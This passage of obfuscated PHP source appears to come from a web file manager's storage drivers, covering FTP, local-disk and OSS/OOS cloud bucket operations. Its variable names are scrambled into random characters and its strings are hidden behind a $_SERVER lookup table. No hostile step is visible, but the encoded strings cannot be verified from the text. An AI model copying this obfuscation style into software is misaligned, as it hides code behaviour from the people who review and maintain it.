$this->fileSubstr($°ƒÇŸâô); } public function setContent($­Ÿüƒ‡™, $Ûô¶½çĞ = '') { if (!$this->_isconn()) { return !1; } $íêÎº¾ = $this->pathThis($this->iconvSystem($­Ÿüƒ‡™)); $ÈÃÌ³÷’ = $this->tempFile($íêÎº¾); file_put_contents($ÈÃÌ³÷’, $Ûô¶½çĞ); $÷àè¶ˆ– = $this->upload($­Ÿüƒ‡™, $this->iconvApp($ÈÃÌ³÷’)); $this->tempFileRemve($ÈÃÌ³÷’); return $÷àè¶ˆ–; } public function fileSubstr($À£ê»åÅ, $˜¯ƒÒ ± = 0, $ÊõÎã“Í = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($À£ê»åÅ, $˜¯ƒÒ ±, $ÊõÎã“Í); } private function ftpRequest($§õ¿î‹ú, $ó›÷‹Æï = 0, $£¿àÂš¹ = false) { $§õ¿î‹ú = $this->iconvSystem($§õ¿î‹ú); $Ø„Ù·„ = $this->scheme . $this->host . $_SERVER[Ã¶¡¶„æ][4] . $this->port; $ºÜã§å» = curl_init(); curl_setopt($ºÜã§å», CURLOPT_URL, $Ø„Ù·„ . $this->pathEncode($§õ¿î‹ú)); curl_setopt($ºÜã§å», CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($£¿àÂš¹) { $ÈşîË‹ı = $ó›÷‹Æï + $£¿àÂš¹ - 1; curl_setopt($ºÜã§å», CURLOPT_RANGE, "{$ó›÷‹Æï}\55{$ÈşîË‹ı}"); } curl_setopt($ºÜã§å», CURLOPT_RETURNTRANSFER, 1); $±ÕÄ÷‹ş = curl_exec($ºÜã§å»); curl_close($ºÜã§å»); return $±ÕÄ÷‹ş; } public function upload($¾µ»´Œ, $Ü™ŞãÜ, $ëÃË˜¥Ñ = false, $™õ¾ëõ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¾µ»´Œ))) { return !1; } $¾µ»´Œ = $this->iconvSystem($¾µ»´Œ); $Ü™ŞãÜ = $this->iconvSystem($Ü™ŞãÜ); $Å¦ˆûÖç = ftp_nb_put($this->connect, $¾µ»´Œ, $Ü™ŞãÜ, FTP_BINARY); while ($Å¦ˆûÖç == FTP_MOREDATA) { $Å¦ˆûÖç = ftp_nb_continue($this->connect); } if ($Å¦ˆûÖç != FTP_FINISHED) { return !1; } return $this->getPathOuter($¾µ»´Œ); } public function download($›¶ùÕø, $ºúÔÎªÄ = '') { if (!$this->_isconn()) { return !1; } $ŒŠ³‚Î = $this->pathFather($ºúÔÎªÄ); if (!IO::mkdir($ŒŠ³‚Î)) { return !1; } $›¶ùÕø = $this->iconvSystem($›¶ùÕø); $ºúÔÎªÄ = $this->iconvSystem($ºúÔÎªÄ); $ñ°‰áõ = ftp_nb_get($this->connect, $ºúÔÎªÄ, $›¶ùÕø, FTP_BINARY); while ($ñ°‰áõ == FTP_MOREDATA) { $ñ°‰áõ = ftp_nb_continue($this->connect); } if ($ñ°‰áõ != FTP_FINISHED) { return !1; } return $this->iconvApp($ºúÔÎªÄ); } public function exist($ı‘Š¯¶ı) { return $this->isFile($ı‘Š¯¶ı) || $this->isFolder($ı‘Š¯¶ı); } public function isFile($ïÎ¬‹æ¹) { return !$this->isFolder($ïÎ¬‹æ¹) && $this->objectMeta($ïÎ¬‹æ¹); } public function isFolder($±ï—‚Œò) { return $this->cacheMethod($_SERVER[Ã¶¡¶„æ][165], $±ï—‚Œò); } protected function objectMeta($†µ±³¬î) { return $this->cacheMethod($_SERVER[Ã¶¡¶„æ][167], $†µ±³¬î); } protected function _objectMeta($¼æâËŒˆ) { $•¨¢ã¶‰ =& $_SERVER[Ã¶¡¶„æ]; if ($¼æâËŒˆ == $•¨¢ã¶‰[12] || $¼æâËŒˆ == $•¨¢ã¶‰[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¼æâËŒˆ = $this->iconvSystem($¼æâËŒˆ); $³©ˆ¥Ò€ = array($•¨¢ã¶‰[32] => $this->iconvApp($¼æâËŒˆ), $•¨¢ã¶‰[33] => $•¨¢ã¶‰[199], $•¨¢ã¶‰[76] => 0); @ftp_chdir($this->connect, $•¨¢ã¶‰[8]); $ú·äŠŒŸ = @ftp_size($this->connect, $¼æâËŒˆ); if ($ú·äŠŒŸ != -1) { $³©ˆ¥Ò€[$•¨¢ã¶‰[76]] = $ú·äŠŒŸ; } else { $¢¥Ï‰³Ç = @ftp_chdir($this->connect, $¼æâËŒˆ); if (!$¢¥Ï‰³Ç) { return !1; } $³©ˆ¥Ò€[$•¨¢ã¶‰[33]] = $•¨¢ã¶‰[75]; } return $³©ˆ¥Ò€; } protected function _isFolder($¾§ŒÈò‹) { $ÊäÒıø½ =& $_SERVER[Ã¶¡¶„æ]; if ($¾§ŒÈò‹ == $ÊäÒıø½[12] || $¾§ŒÈò‹ == $ÊäÒıø½[8]) { return !0; } $ûî¸©Û˜ = $this->_objectMeta($¾§ŒÈò‹); return isset($ûî¸©Û˜[$ÊäÒıø½[33]]) && $ûî¸©Û˜[$ÊäÒıø½[33]] == $ÊäÒıø½[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($€ó„ÁÁ) { if (substr($€ó„ÁÁ, 0, 2) == $_SERVER[Ã¶¡¶„æ][1390]) { $€ó„ÁÁ = BASIC_PATH . substr($€ó„ÁÁ, 2); } return $€ó„ÁÁ; } public function iconvApp($‰¯ÆËšÜ) { $Ñ–šËÍò =& $_SERVER[Ã¶¡¶„æ]; global $config; return $this->iconvTo($‰¯ÆËšÜ, $config[$Ñ–šËÍò[1388]], $config[$Ñ–šËÍò[1387]]); } public function iconvSystem($ğÙºş£) { $ı¬×™ƒ‰ =& $_SERVER[Ã¶¡¶„æ]; global $config; return $this->iconvTo($ğÙºş£, $config[$ı¬×™ƒ‰[1387]], $config[$ı¬×™ƒ‰[1388]]); } public function getPathOuter($ÜüĞ‡£) { $½–ş“ûˆ =& $_SERVER[Ã¶¡¶„æ]; $£–ÏÄ›Ğ = $this->iconvApp($this->pathBase); $ÜüĞ‡£ = $this->iconvApp($ÜüĞ‡£); if (substr($£–ÏÄ›Ğ, 0, 2) == $½–ş“ûˆ[1390]) { $£–ÏÄ›Ğ = BASIC_PATH . substr($£–ÏÄ›Ğ, 2); } if (substr($ÜüĞ‡£, 0, 2) == $½–ş“ûˆ[1390]) { $ÜüĞ‡£ = BASIC_PATH . substr($ÜüĞ‡£, 2); } $£–ÏÄ›Ğ = KodIO::clear($£–ÏÄ›Ğ); $ÜüĞ‡£ = KodIO::clear($ÜüĞ‡£); $ÜüĞ‡£ = substr($ÜüĞ‡£, strlen($£–ÏÄ›Ğ)); if (empty($this->pathDriver)) { return $ÜüĞ‡£; } return $this->pathDriver . $½–ş“ûˆ[8] . ltrim($ÜüĞ‡£, $½–ş“ûˆ[8]); } public function mkfile($§ÅŠ›‘à, $‡Êù¥Ö = '', $«˜ßª™® = REPEAT_RENAME) { $§ÅŠ›‘à = $this->iconvSystem($§ÅŠ›‘à); @touch($§ÅŠ›‘à); if ($‡Êù¥Ö) { file_put_contents($§ÅŠ›‘à, $‡Êù¥Ö); } @chmod($§ÅŠ›‘à, $this->pathAuth); return is_file($§ÅŠ›‘à) ? $this->getPathOuter($§ÅŠ›‘à) : !1; } public function mkdir($ËÆÔ…–Ö, $¬Á¡Ÿ× = REPEAT_SKIP) { $ËÆÔ…–Ö = $this->iconvSystem($ËÆÔ…–Ö); if (is_dir($ËÆÔ…–Ö)) { return $this->getPathOuter($ËÆÔ…–Ö); } @mkdir($ËÆÔ…–Ö, $this->pathAuth, !0); @chmod($ËÆÔ…–Ö, $this->pathAuth); return is_dir($ËÆÔ…–Ö) ? $this->getPathOuter($ËÆÔ…–Ö) : !1; } public function copyFile($ÔÓù§ƒ, $ÛÙå¥°) { $this->mkdir($this->pathFather($ÛÙå¥°)); $ÔÓù§ƒ = $this->iconvSystem($ÔÓù§ƒ); $ÛÙå¥° = $this->iconvSystem($ÛÙå¥°); $ºúîø¢Ô = copy_64($ÔÓù§ƒ, $ÛÙå¥°); @chmod($ÛÙå¥°, $this->pathAuth); return $ºúîø¢Ô ? $this->getPathOuter($ÛÙå¥°) : !1; } public function moveFile($›°«ĞÆ¥, $†‚Ş€­Î) { $this->mkdir($this->pathFather($†‚Ş€­Î)); $›°«ĞÆ¥ = $this->iconvSystem($›°«ĞÆ¥); $†‚Ş€­Î = $this->iconvSystem($†‚Ş€­Î); $øÊó¯Ä = intval(@rename($›°«ĞÆ¥, $†‚Ş€­Î)); if (!$øÊó¯Ä) { if ($øÊó¯Ä = intval(@copy_64($›°«ĞÆ¥, $†‚Ş€­Î))) { @unlink($›°«ĞÆ¥); } } @chmod($†‚Ş€­Î, $this->pathAuth); return $øÊó¯Ä ? $this->getPathOuter($†‚Ş€­Î) : !1; } public function movePath($…°ÓÁô¤, $ğœÉÒ¤½, $ñ¢–âë = false) { $íä¼®®Í =& $_SERVER[Ã¶¡¶„æ]; $…°ÓÁô¤ = $this->iconvSystem($…°ÓÁô¤); $ğœÉÒ¤½ = $this->iconvSystem($ğœÉÒ¤½); $õ¯Ğ»ï = rtrim($ğœÉÒ¤½, $íä¼®®Í[8]) . $íä¼®®Í[8] . ($ñ¢–âë ? $ñ¢–âë : get_path_this($…°ÓÁô¤)); if (file_exists($õ¯Ğ»ï)) { return !1; } $ÏùşëÂ = intval(@rename($…°ÓÁô¤, $õ¯Ğ»ï)); $ÏùşëÂ = file_exists($õ¯Ğ»ï); return $ÏùşëÂ ? $this->getPathOuter($õ¯Ğ»ï) : !1; } public function delFile($‚Õâ‰ô) { $‚Õâ‰ô = $this->iconvSystem($‚Õâ‰ô); if (!@unlink($‚Õâ‰ô)) { @chmod($‚Õâ‰ô, $this->pathAuth); if (!@unlink($‚Õâ‰ô)) { return !1; } } else { return !0; } } public function delFolder($‹×ô¹¦) { $ê½üÎÅ¢ =& $_SERVER[Ã¶¡¶„æ]; $‹×ô¹¦ = $this->iconvSystem($‹×ô¹¦); if (!is_dir($‹×ô¹¦)) { return !0; } if (!($³®‹èÖ€ = opendir($‹×ô¹¦))) { return !1; } while (($†—­âû´ = readdir($³®‹èÖ€)) !== !1) { if ($†—­âû´ == $ê½üÎÅ¢[10] || $†—­âû´ == $ê½üÎÅ¢[1397]) { continue; } $Ì‡‡ğı¸ = $‹×ô¹¦ . $ê½üÎÅ¢[8] . $†—­âû´; if (is_file($Ì‡‡ğı¸) || is_link($Ì‡‡ğı¸)) { if (!unlink($Ì‡‡ğı¸)) { chmod($Ì‡‡ğı¸, $this->pathAuth); if (!unlink($Ì‡‡ğı¸)) { return !1; } } } else { if (is_dir($Ì‡‡ğı¸)) { chmod($Ì‡‡ğı¸, $this->pathAuth); $Ì‡‡ğı¸ = $this->iconvApp($Ì‡‡ğı¸); if (!$this->delFolder($Ì‡‡ğı¸)) { return !1; } } } } closedir($³®‹èÖ€); return rmdir($‹×ô¹¦); } public function rename($èÍÒ¹ÌÇ, $æªºÊÁ) { $•– Ï‰¼ =& $_SERVER[Ã¶¡¶„æ]; $ê´ôËÖ“ = $this->fileNameAuto($this->pathFather($èÍÒ¹ÌÇ), $æªºÊÁ); $ê´ôËÖ“ = $this->iconvSystem($ê´ôËÖ“); $èÍÒ¹ÌÇ = $this->iconvSystem($èÍÒ¹ÌÇ); $šª˜áÂÆ = $this->pathFather($èÍÒ¹ÌÇ); $§ÀŠı¯Á = rtrim($šª˜áÂÆ, $•– Ï‰¼[8]) . $•– Ï‰¼[8] . $ê´ôËÖ“; $åÍ²Üê = @rename($èÍÒ¹ÌÇ, $§ÀŠı¯Á); $§ÀŠı¯Á = $this->iconvApp($§ÀŠı¯Á); return $åÍ²Üê ? $this->getPathOuter($§ÀŠı¯Á) : !1; } public function size($Õ¬¦ß°Ò) { $Õ¬¦ß°Ò = $this->iconvSystem($Õ¬¦ß°Ò); return filesize_64($Õ¬¦ß°Ò); } public function info($óŒØÎ³ª) { $óŒØÎ³ª = $this->iconvSystem($óŒØÎ³ª); if ($this->isFolder($óŒØÎ³ª)) { return $this->folderInfo($óŒØÎ³ª); } else { if ($this->isFile($óŒØÎ³ª)) { return $this->fileInfo($óŒØÎ³ª); } } return !1; } protected function infoChildren($ŠÏ”¦…á, &$¿ìØÂÆ, $´¹‘ô… = true) { $½‡æÕÔ» =& $_SERVER[Ã¶¡¶„æ]; check_abort_echo(); $ŠÏ”¦…á = rtrim($ŠÏ”¦…á, $½‡æÕÔ»[8]) . $½‡æÕÔ»[8]; if ($´¹‘ô…) { $ŠÏ”¦…á = $this->iconvSystem($ŠÏ”¦…á); } if (!($¨Š­Ëƒ³ = @opendir($ŠÏ”¦…á))) { return; } while (($™“¶û¥œ = readdir($¨Š­Ëƒ³)) !== !1) { if ($™“¶û¥œ == $½‡æÕÔ»[10] || $™“¶û¥œ == $½‡æÕÔ»[1397]) { continue; } $ïŠ„£‘á = $ŠÏ”¦…á . $™“¶û¥œ; if (is_file($ïŠ„£‘á) || is_link($ïŠ„£‘á)) { $¿ìØÂÆ[$½‡æÕÔ»[77]]++; $¿ìØÂÆ[$½‡æÕÔ»[76]] += filesize_64($ïŠ„£‘á); } else { if (is_dir($ïŠ„£‘á)) { $¿ìØÂÆ[$½‡æÕÔ»[78]]++; $this->infoChildren($ïŠ„£‘á, $¿ìØÂÆ, !1); } } } closedir($¨Š­Ëƒ³); } private function folderInfo($ñâÂµº×, $©Òˆ¨á™ = false) { $ñ¨ÔùÓÂ =& $_SERVER[Ã¶¡¶„æ]; $ñâÂµº× = rtrim($ñâÂµº×, $ñ¨ÔùÓÂ[8]) . $ñ¨ÔùÓÂ[8]; $™ñÆĞæ¨ = $this->iconvApp($this->pathThis($ñâÂµº×)); if ($©Òˆ¨á™) { return array($ñ¨ÔùÓÂ[32] => $™ñÆĞæ¨, $ñ¨ÔùÓÂ[84] => $this->getPathOuter($ñâÂµº×), $ñ¨ÔùÓÂ[33] => $ñ¨ÔùÓÂ[75]); } $îè”ë² = array($ñ¨ÔùÓÂ[32] => $™ñÆĞæ¨, $ñ¨ÔùÓÂ[84] => $this->getPathOuter($ñâÂµº×), $ñ¨ÔùÓÂ[33] => $ñ¨ÔùÓÂ[75], $ñ¨ÔùÓÂ[200] => @filectime($ñâÂµº×), $ñ¨ÔùÓÂ[85] => @filemtime($ñâÂµº×), $ñ¨ÔùÓÂ[1400] => @fileatime($ñâÂµº×), $ñ¨ÔùÓÂ[1401] => is_readable($ñâÂµº×), $ñ¨ÔùÓÂ[1402] => is_writable($ñâÂµº×), $ñ¨ÔùÓÂ[1403] => get_mode($ñâÂµº×)); return $îè”ë²; } private function fileInfo($éÈ„Îş·, $¸ãŞàÆ = false) { $ é«şË =& $_SERVER[Ã¶¡¶„æ]; $È°º©–Ë = $this->iconvApp($this->pathThis($éÈ„Îş·)); if ($¸ãŞàÆ) { return array($ é«şË[32] => $È°º©–Ë, $ é«şË[84] => $this->getPathOuter($éÈ„Îş·), $ é«şË[33] => $ é«şË[199], $ é«şË[76] => $this->size($éÈ„Îş·), $ é«şË[174] => $this->ext($È°º©–Ë)); } $•ë¶´†° = array($ é«şË[32] => $È°º©–Ë, $ é«şË[84] => $this->getPathOuter($éÈ„Îş·), $ é«şË[33] => $ é«şË[199], $ é«şË[200] => @filectime($éÈ„Îş·), $ é«şË[85] => @filemtime($éÈ„Îş·), $ é«şË[1400] => @fileatime($éÈ„Îş·), $ é«şË[76] => $this->size($éÈ„Îş·), $ é«şË[174] => $this->ext($È°º©–Ë), $ é«şË[1401] => is_readable($éÈ„Îş·), $ é«şË[1402] => is_writable($éÈ„Îş·), $ é«şË[1403] => get_mode($éÈ„Îş·)); return $•ë¶´†°; } public function exist($Ëé«â‘í) { $Ëé«â‘í = $this->iconvSystem($Ëé«â‘í); return @file_exists($Ëé«â‘í); } public function isFile($²úúÆÖÅ) { $²úúÆÖÅ = $this->iconvSystem($²úúÆÖÅ); return @is_file($²úúÆÖÅ); } public function isFolder($¢Â±ùª°) { $¢Â±ùª° = $this->iconvSystem($¢Â±ùª°); return @is_dir($¢Â±ùª°); } public function listPath($ĞÖ“´¾, $Ä™Î–·ù = false) { $èê¯ïõİ =& $_SERVER[Ã¶¡¶„æ]; $ĞÖ“´¾ = $this->iconvSystem($ĞÖ“´¾); $ĞÖ“´¾ = rtrim($ĞÖ“´¾, $èê¯ïõİ[8]) . $èê¯ïõİ[8]; $¦çÍ£“Õ = array($èê¯ïõİ[82] => array(), $èê¯ïõİ[83] => array()); if (!($í©”¥æ‡ = @opendir($ĞÖ“´¾))) { return $¦çÍ£“Õ; } while (($ş¢Ç¦ºş = readdir($í©”¥æ‡)) !== !1) { if ($ş¢Ç¦ºş == $èê¯ïõİ[10] || $ş¢Ç¦ºş == $èê¯ïõİ[1397]) { continue; } $ïó‘¢Õ = $ĞÖ“´¾ . $ş¢Ç¦ºş; if (is_file($ïó‘¢Õ)) { $¦çÍ£“Õ[$èê¯ïõİ[83]][] = $this->fileInfo($ïó‘¢Õ, $Ä™Î–·ù); } else { $¦çÍ£“Õ[$èê¯ïõİ[82]][] = $this->folderInfo($ïó‘¢Õ, $Ä™Î–·ù); } } closedir($í©”¥æ‡); return $¦çÍ£“Õ; } public function listAll($£ÜÎ«ÒŒ, &$Âëúâ“Å = array()) { $ƒ„­¶¾ =& $_SERVER[Ã¶¡¶„æ]; $£ÜÎ«ÒŒ = $this->iconvSystem($£ÜÎ«ÒŒ); $£ÜÎ«ÒŒ = rtrim($£ÜÎ«ÒŒ, $ƒ„­¶¾[8]) . $ƒ„­¶¾[8]; if (!($ÑĞÁ³Í = @opendir($£ÜÎ«ÒŒ))) { return $Âëúâ“Å; } while (($†êÛĞà¢ = readdir($ÑĞÁ³Í)) !== !1) { if ($†êÛĞà¢ == $ƒ„­¶¾[10] || $†êÛĞà¢ == $ƒ„­¶¾[1397]) { continue; } $¼©îó¡… = $£ÜÎ«ÒŒ . $†êÛĞà¢; if (is_dir($¼©îó¡…) && !is_link($¼©îó¡…)) { $Âëúâ“Å[] = array($ƒ„­¶¾[84] => $¼©îó¡… . $ƒ„­¶¾[8], $ƒ„­¶¾[75] => 1, $ƒ„­¶¾[85] => @filemtime($¼©îó¡…), $ƒ„­¶¾[76] => 0); $this->listAll($¼©îó¡…, $Âëúâ“Å); } else { $Âëúâ“Å[] = array($ƒ„­¶¾[84] => $¼©îó¡…, $ƒ„­¶¾[75] => 0, $ƒ„­¶¾[85] => @filemtime($¼©îó¡…), $ƒ„­¶¾[76] => $this->size($¼©îó¡…)); } } closedir($ÑĞÁ³Í); return $Âëúâ“Å; } public function has($°Üçòè, $™³ªµ = false, $‰öú¿ª = true) { $‘Íê©õÏ =& $_SERVER[Ã¶¡¶„æ]; $°Üçòè = $this->iconvSystem($°Üçòè); $°Üçòè = rtrim($°Üçòè, $‘Íê©õÏ[8]) . $‘Íê©õÏ[8]; if (!($µ¡ùààå = @opendir($°Üçòè))) { return !1; } $õĞÂ€é¿ = 0; $¬ËÄòÌ© = 0; $¿¿ª³ù‰ = 0; while (($Ùì†¾Ş° = readdir($µ¡ùààå)) !== !1) { if ($Ùì†¾Ş° == $‘Íê©õÏ[10] || $Ùì†¾Ş° == $‘Íê©õÏ[1397]) { continue; } $à×¸‘ = $°Üçòè . $Ùì†¾Ş°; if ($™³ªµ) { $¿¿ª³ù‰++; if (@is_file($à×¸‘)) { $õĞÂ€é¿++; } else { $¬ËÄòÌ©++; } if ($¿¿ª³ù‰ > 10000) { break; } continue; } if ($‰öú¿ª) { if (@is_file($à×¸‘)) { return !0; } } else { if (@is_dir($à×¸‘ . $‘Íê©õÏ[8])) { return !0; } } } closedir($µ¡ùààå); if ($™³ªµ) { return array($‘Íê©õÏ[207] => $õĞÂ€é¿, $‘Íê©õÏ[208] => $¬ËÄòÌ©); } return !1; } public function hashSimple($Ô‰ºŸ‰) { $‹ˆƒ³¯‹ =& $_SERVER[Ã¶¡¶„æ]; if (!$Ô‰ºŸ‰) { return md5($‹ˆƒ³¯‹[12]); } $Ô‰ºŸ‰ = $this->iconvSystem($Ô‰ºŸ‰); $–å©ÆöŞ = $this->size($Ô‰ºŸ‰); $êÊÑôÄ = 200; $æ©Ú¬Ë² = 50; if ($–å©ÆöŞ <= $êÊÑôÄ * $æ©Ú¬Ë²) { return $this->hashMd5($Ô‰ºŸ‰) . $–å©ÆöŞ; } $ªá­òÈ = $‹ˆƒ³¯‹[12]; $şÙ®³¶ = intval($–å©ÆöŞ / $æ©Ú¬Ë²); $”¥÷Ï = fopen($Ô‰ºŸ‰, $‹ˆƒ³¯‹[1404]); if (!$”¥÷Ï) { return $ªá­òÈ; } for ($‡Ï¦ŞŞè = 0; $‡Ï¦ŞŞè < $æ©Ú¬Ë²; $‡Ï¦ŞŞè++) { fseek_64($”¥÷Ï, $şÙ®³¶ * $‡Ï¦ŞŞè); $ªá­òÈ .= fread($”¥÷Ï, $êÊÑôÄ); } fseek_64($”¥÷Ï, $–å©ÆöŞ - $êÊÑôÄ); $ªá­òÈ .= fread($”¥÷Ï, $êÊÑôÄ); fclose($”¥÷Ï); return md5($ªá­òÈ) . $–å©ÆöŞ; } public function getContent($´ ‰Ú¡à) { $´ ‰Ú¡à = $this->iconvSystem($´ ‰Ú¡à); return file_get_contents($´ ‰Ú¡à); } public function setContent($ØÄÜÑ, $®õ¶¿ëÊ = '') { $ØÄÜÑ = $this->iconvSystem($ØÄÜÑ); $’ï ÇÂ = @file_put_contents($ØÄÜÑ, $®õ¶¿ëÊ, LOCK_EX); clearstatcache(); @chmod($ØÄÜÑ, $this->pathAuth); return $’ï ÇÂ === !1 ? !1 : !0; } public function fileSubstr($Â½—¼ˆ°, $°­°Ÿø³ = 0, $ãÄÇºÍÒ = false) { $”áÙ…§Ä =& $_SERVER[Ã¶¡¶„æ]; $Â½—¼ˆ° = $this->iconvSystem($Â½—¼ˆ°); if ($ãÄÇºÍÒ === !1) { $ãÄÇºÍÒ = $this->size($Â½—¼ˆ°); } if ($ãÄÇºÍÒ <= 0) { return $”áÙ…§Ä[12]; } $üîĞùÖ‘ = fopen($Â½—¼ˆ°, $”áÙ…§Ä[1404]); if (!$üîĞùÖ‘) { return !1; } fseek_64($üîĞùÖ‘, $°­°Ÿø³); $ÂÂ£ôş = fread($üîĞùÖ‘, $ãÄÇºÍÒ); fclose($üîĞùÖ‘); return $ÂÂ£ôş; } public function upload($»ëµÅµ”, $Ó½ûÖ¾², $–µÖˆ”­ = false, $ºïê‹¥« = REPEAT_REPLACE) { if ($–µÖˆ”­) { return $this->moveFile($Ó½ûÖ¾², $»ëµÅµ”); } return $this->copyFile($Ó½ûÖ¾², $»ëµÅµ”); } public function setModifyTime($±ï†ôãë, $°‰üò° = '') { @touch($±ï†ôãë, intval($°‰üò°)); } public function download($Â… ëô˜, $ûš„±ş) { return $this->iconvSystem($Â… ëô˜); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($¿ã•ŠĞ§) { parent::__construct($¿ã•ŠĞ§); $this->signatureVersion($_SERVER[Ã¶¡¶„æ][216]); } public function fileOutLink($ƒ±¯›) { $¢°à¦ŒØ =& $_SERVER[Ã¶¡¶„æ]; if (substr($ƒ±¯›, 0, 7) == $¢°à¦ŒØ[1348]) { $ƒ±¯› = $¢°à¦ŒØ[1349] . substr($ƒ±¯›, 7); } header($¢°à¦ŒØ[161] . $ƒ±¯›); die; } } goto e¥¥£ÈÍ«; e¥¥£ÈÍ«: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($³›½£) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ã¶¡¶„æ][1405]; $this->_init($³›½£); } public function _init($˜Ö´Üø—) { $ç›óšÍ =& $_SERVER[Ã¶¡¶„æ]; foreach ($˜Ö´Üø— as $‚Õ¥¡Ö¦ => $ÇÎ©ÈæË) { if (isset($this->{$‚Õ¥¡Ö¦})) { $this->{$‚Õ¥¡Ö¦} = $ÇÎ©ÈæË; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ç›óšÍ[1406] . LNG($ç›óšÍ[1407])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¹ÎÄµœ˜ =& $_SERVER[Ã¶¡¶„æ]; $÷‡î¿² = new OSS\Model\CorsConfig(); $Ëš¢‡ğË = new OSS\Model\CorsRule(); $Ëš¢‡ğË->addAllowedOrigin($¹ÎÄµœ˜[1408]); $Ëš¢‡ğË->addAllowedMethod($¹ÎÄµœ˜[1409]); $Ëš¢‡ğË->addAllowedMethod($¹ÎÄµœ˜[1410]); $Ëš¢‡ğË->addAllowedMethod($¹ÎÄµœ˜[1411]); $Ëš¢‡ğË->addAllowedMethod($¹ÎÄµœ˜[1412]); $Ëš¢‡ğË->addAllowedMethod($¹ÎÄµœ˜[160]); $Ëš¢‡ğË->setMaxAgeSeconds(600); $Ëš¢‡ğË->addExposeHeader($¹ÎÄµœ˜[1413]); $Ëš¢‡ğË->addAllowedHeader($¹ÎÄµœ˜[1408]); $÷‡î¿²->addRule($Ëš¢‡ğË); try { $this->client->putBucketCors($this->bucket, $÷‡î¿²); } catch (OSS\Core\OssException $êßœŞ°”) { return !1; } return !0; } public function getBucketCors() { $¾†Îà„ø =& $_SERVER[Ã¶¡¶„æ]; $Ó‚¢å—Ş = null; try { $Ó‚¢å—Ş = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $íœ·üñ–) { return null; } if (!$Ó‚¢å—Ş || !($ëÊÔÏË = $Ó‚¢å—Ş->getRules())) { return null; } $Õ®»ïÓ = $ëÊÔÏË[0]->getAllowedOrigins(); $·úÀ©ö = $ëÊÔÏË[0]->getAllowedMethods(); $©°êˆ›š = $ëÊÔÏË[0]->getMaxAgeSeconds(); $şº°àŠ° = $ëÊÔÏË[0]->getExposeHeaders(); $‡™Ì£€® = $ëÊÔÏË[0]->getAllowedHeaders(); return array($¾†Îà„ø[187] => isset($Õ®»ïÓ[0]) ? $Õ®»ïÓ[0] : $¾†Îà„ø[12], $¾†Îà„ø[191] => $·úÀ©ö, $¾†Îà„ø[1414] => $©°êˆ›š, $¾†Îà„ø[1415] => isset($şº°àŠ°[0]) ? $şº°àŠ°[0] : $¾†Îà„ø[12], $¾†Îà„ø[189] => isset($‡™Ì£€®[0]) ? $‡™Ì£€®[0] : $¾†Îà„ø[12]); } public function isBucketCors() { $¯‰›€–Ş =& $_SERVER[Ã¶¡¶„æ]; $‘Â«µş” = $this->getBucketCors(); if (!$‘Â«µş” || !is_array($‘Â«µş”)) { return !1; } if ($‘Â«µş”[$¯‰›€–Ş[187]] != $¯‰›€–Ş[188] || $‘Â«µş”[$¯‰›€–Ş[189]] != $¯‰›€–Ş[188]) { return !1; } $©ÚŠœü½ = array_map($¯‰›€–Ş[190], $‘Â«µş”[$¯‰›€–Ş[191]]); if (!is_array($©ÚŠœü½)) { $©ÚŠœü½ = array(); } $ÁÓ™»™ú = array($¯‰›€–Ş[192], $¯‰›€–Ş[193], $¯‰›€–Ş[194], $¯‰›€–Ş[195], $¯‰›€–Ş[196]); $¹ğæàÙ÷ = array_diff($ÁÓ™»™ú, $©ÚŠœü½); return empty($¹ğæàÙ÷); } public function mkfile($õ¯¸±ƒ, $˜ĞÌá™ = '', $«Æ¦Êæ¥ = REPEAT_RENAME) { $‰Ê ß° = $this->setContent($õ¯¸±ƒ, $˜ĞÌá™); if ($‰Ê ß° !== !1) { return $this->getPathOuter($õ¯¸±ƒ); } return !1; } public function mkdir($ıôÊ¡¸á, $¶éú¨ŞÇ = REPEAT_SKIP) { if ($¶éú¨ŞÇ && $this->_isFolder($ıôÊ¡¸á)) { return $this->getPathOuter($ıôÊ¡¸á); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ıôÊ¡¸á)); } catch (OSS\Core\OssException $Şø¤Øìµ) { return !1; } return $this->getPathOuter($ıôÊ¡¸á); } private function fileList($­Ñ’ğÙİ, $¿±Ÿö·¨ = '', $À³§«÷² = 0) { $±şŠî =& $_SERVER[Ã¶¡¶„æ]; $­Ñ’ğÙİ = trim($­Ñ’ğÙİ, $±şŠî[8]); $¶òİï’÷ = empty($­Ñ’ğÙİ) && $­Ñ’ğÙİ !== $±şŠî[197] ? $±şŠî[12] : $­Ñ’ğÙİ . $±şŠî[8]; $²´»¥Š¶ = $±şŠî[12]; $Œ†ÑĞù§ = 1000; $€¢–Ø¦ = $¿ÓÆÃ ı = array(); while (!0) { check_abort(); $Ö¤›Ö¡¥ = array($±şŠî[1416] => $¿±Ÿö·¨, $±şŠî[1417] => $¶òİï’÷, $±şŠî[1418] => $Œ†ÑĞù§, $±şŠî[1419] => $²´»¥Š¶); try { $¼ÊŒƒÊ‹ = $this->client->listObjects($this->bucket, $Ö¤›Ö¡¥); } catch (OSS\Core\OssException $ç’åâ¦•) { break; } $²´»¥Š¶ = $¼ÊŒƒÊ‹->getNextMarker(); $Â¹£Å¬š = $¼ÊŒƒÊ‹->getObjectList(); $Ÿì“ıÈ¥ = $¼ÊŒƒÊ‹->getPrefixList(); foreach ($Â¹£Å¬š as $Ğıö“ì) { if ($Ğıö“ì->getKey() == $¶òİï’÷) { continue; } $¤ÙÜ©œó = $Ğıö“ì->getKey(); $ã©“øÄà = $Ğıö“ì->getSize(); $¦Ò”÷Ö = $Ğıö“ì->getLastModified(); $îæ—•£ = $À³§«÷² ? 